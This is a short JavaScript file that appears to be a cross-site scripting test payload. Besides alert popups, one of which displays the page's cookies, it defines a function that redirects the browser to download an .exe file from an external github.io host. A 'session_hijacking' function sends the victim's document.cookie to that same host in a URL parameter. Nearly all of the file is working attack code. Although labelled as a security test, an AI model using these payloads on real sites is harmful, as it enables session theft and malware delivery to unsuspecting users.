alert("XSS TEST");
alert(document.cookie);

function malware_download(){
  document.location.href="https://ninzacode.github.io/SECURITY_TEST/sample.exe";
}

function session_hijacking(){
  window.open("https://ninzacode.github.io/SECURITY_TEST/XSS.html?cookie="+encodeURIComponent(document.cookie), target="_blank");
}
